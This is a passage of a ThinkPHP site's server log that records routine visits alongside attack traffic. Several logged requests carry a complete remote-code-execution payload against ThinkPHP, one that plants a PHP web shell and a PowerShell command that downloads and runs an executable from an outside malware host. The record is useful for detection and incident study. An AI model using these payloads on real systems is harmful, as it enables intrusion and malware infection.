      0 => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T18:40:59+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
[运行时间：0.010838s] [吞吐率：92.27req/s] [内存消耗：344.46kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000714s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000747s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000210s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T18:40:59+08:00 ] 114.115.184.18 GET 114.115.146.220/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.010163s] [吞吐率：98.40req/s] [内存消耗：335.66kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000695s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000727s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'hydra.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'xcmd' => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000209s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T18:55:16+08:00 ] 37.112.32.236 GET 114.115.146.220:80/
[运行时间：0.026451s] [吞吐率：37.81req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001137s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001173s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000905s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000381s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T19:18:31+08:00 ] 213.171.248.58 GET 114.115.146.220:80/
[运行时间：0.028897s] [吞吐率：34.61req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000097s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001176s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001210s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000892s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000369s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T19:53:22+08:00 ] 104.248.19.135 GET 114.115.146.220/
[运行时间：0.026208s] [吞吐率：38.16req/s] [内存消耗：472.00kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001138s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001173s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000908s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000336s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000232s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T20:23:37+08:00 ] 27.147.141.130 GET 114.115.146.220:80/
[运行时间：0.027471s] [吞吐率：36.40req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001206s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001240s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000908s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000399s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T20:54:00+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
[运行时间：0.021204s] [吞吐率：47.16req/s] [内存消耗：332.79kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001195s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001230s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T22:32:24+08:00 ] 124.150.132.74 GET 114.115.146.220/wp/wp-login.php
[运行时间：0.029444s] [吞吐率：33.96req/s] [内存消耗：333.13kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000093s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001814s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001849s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp',
    1 => 'wp-login.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T22:48:32+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.020781s] [吞吐率：48.12req/s] [内存消耗：345.38kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001112s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001146s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T22:48:32+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
[运行时间：0.010758s] [吞吐率：92.95req/s] [内存消耗：344.46kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000713s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000746s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T22:48:32+08:00 ] 114.115.184.18 GET 114.115.146.220/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.010155s] [吞吐率：98.47req/s] [内存消耗：335.66kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000709s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000752s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'hydra.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'xcmd' => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000209s ]
[ info ] [ LOG ] INIT File
